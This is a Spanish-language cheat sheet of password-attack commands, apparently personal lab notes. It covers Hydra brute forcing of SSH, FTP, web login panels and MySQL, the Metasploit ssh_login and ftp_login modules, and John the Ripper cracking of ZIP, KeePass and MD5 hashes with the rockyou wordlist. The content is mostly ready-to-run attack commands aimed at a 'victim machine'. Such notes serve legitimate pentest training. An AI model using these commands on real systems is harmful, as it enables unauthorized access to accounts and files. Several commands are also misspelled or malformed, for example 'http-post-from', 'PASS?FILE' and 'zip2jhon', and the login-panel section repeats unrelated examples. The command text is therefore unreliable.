Hydra es una herramienta para hacer ataques de fuerza bruta

Es necesario conocer o la contraseña o el usuario.
## Hydra conociendo el usuario

```sh title:"hydra para localizar contraseñas"
 hydra -l <usuarioconocido> -P {rutal al diccionario}://{protocolo}{IP}
 
# -P mayusucla si queremos buscar la password
# -p {password} si conocemos la password
# -l {usuario conocido} si conocemos el usuario
# -L mayuscula si queremos buscar el Usuario

# rockyou path: (diccionario para passroeds)
# /usr/share/wordlists/rockyou.txt

# protocolo
ssh
ftp

# ejemplos
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.27
hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.27

```


## hydra conociendo la password
Cuando tenemos una contraseña pero desconocemos el usuario podemos usar Hydra para fuerza bruta:
```sh title:"hydra para localizar Usuarios"
 hydra -L {rutal al diccionario} -p <passwordUsuario>://{protocolo}{IP}
 
# -P mayusucla si queremos buscar la password
# -p {password} si conocemos la password
# -l {usuario conocido} si conocemos el usuario
# -L mayuscula si queremos buscar el Usuario

# unix_users path: (diccionario para Usuarios)
# /usr/share/wordlists/metasploit/unix_users.txt

# protocolo
ssh
ftp

# ejemplos
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://192.168.0.27
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ftp://192.168.0.27

```


## hydra a panel login
Uso de Hidra en Paneles Login
Probar con el usuario admin

con Burtsuit podemos conocemos la ruta exacta del panel login
la forma de tramitar los datos y el typo de peticion

```sh title:"hydra para panelos login"
 hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt http-post-from "{paht del panel login}:username=admin:passwore=^PASS^: {mensaje de error de panel login en caso de fallo}"
# t 64 poner 64 hilos
# -P mayusucla si queremos buscar la password
# -p {password} si conocemos la password
# -l {usuario conocido} si conocemos el usuario
# -L mayuscula si queremos buscar el Usuario

# unix_users path: (diccionario para Usuarios)
# /usr/share/wordlists/metasploit/unix_users.txt

# protocolo
ssh
ftp

# ejemplos
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://192.168.0.27
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ftp://192.168.0.27

```


# Fuerza bruta con Metasploit
con Metasploit tamiben se puede hacer  fuerza bruta igual que con Hydra
Indicar que esto es más lento que Hydra

```sh title:"metaesploit para fuerza bruta pfr ssh"
msf6 > serch ssh_login
msf6 > use 0
msf6 auxiliary(scanner/ssh/ssh_login) > show options
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME juan
msf6 auxiliary(scanner/ssh/ssh_login) > show options
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS?FILE /user/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOST {IP maquina victima}
msf6 auxiliary(scanner/ssh/ssh_login) > show options
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE false

msf6 auxiliary(scanner/ssh/ssh_login) > run
```



Tambien lo podemos hacer con el protocolo FTP

```sh title:"metaesploit para fuerza bruta por ftp"
msf6 > serch ftp_login
msf6 > use 0
msf6 auxiliary(scanner/ftp/ftp_login) > show options
msf6 auxiliary(scanner/ftp/ftp_login) > set USERNAME juan
msf6 auxiliary(scanner/ftp/ftp_login) > show options
msf6 auxiliary(scanner/ftp/ftp_login) > set PASS?FILE /user/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set RHOST {IP maquina victima}
msf6 auxiliary(scanner/ftp/ftp_login) > show options
msf6 auxiliary(scanner/ftp/ftp_login) > set VERBOSE false

msf6 auxiliary(scanner/ftp/ftp_login) > run
```


# Fuerza bruta a Base de datos
Puerto de Mysql: 3306

si tenemos un potencial Usuario:
```sh title:"hydra para atacar a BD Mysql"
 hydra -t 64 -l {usuarioconocido}} -P /usr/share/wordlists/rockyou.txt mysql://{ipmaquina target}
# t 64 poner 64 hilos
# -P mayusucla si queremos buscar la password
# -p {password} si conocemos la password
# -l {usuario conocido} si conocemos el usuario
# -L mayuscula si queremos buscar el Usuario

# unix_users path: (diccionario para Usuarios)
# /usr/share/wordlists/metasploit/unix_users.txt

# protocolo
mysql

# ejemplos


```



# Jhon the Ripper
Jhon the ripper mos permite hacer cracking de archivos en local, para zip, keepas o cracking the hases basicamente sirve para hacer craking de ficheros en local


## crackear un fichero protegido
Crackear la contraseña de un fichero zip.
```sh title:"Jhon the ripper para crackear un zip, en 2 pasos, primero hash y despues creckear el has"
 zip2jhon {nombreArchivo} > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

## crackar un keepass DB
Crackear la contraseña de un keepass (kdbx)
```sh title:"Jhon the ripper para crackear un la BD de un keepass, en 2 pasos, primero hash y despues creckear el hash"
keepass2jhon {nombrefichero.kdx} >hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

## Crackear hash
Crackear un hash

```sh title:"Jhon the ripper para crackear un hash"
john --wordlist=/usr/share/wordlists/rockyou.txt hash
jhon --format =Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash

# el format te lo da el propio jhon y el formato lo sacamos del hashIdentifier
# md5
# sha1
# ...
```

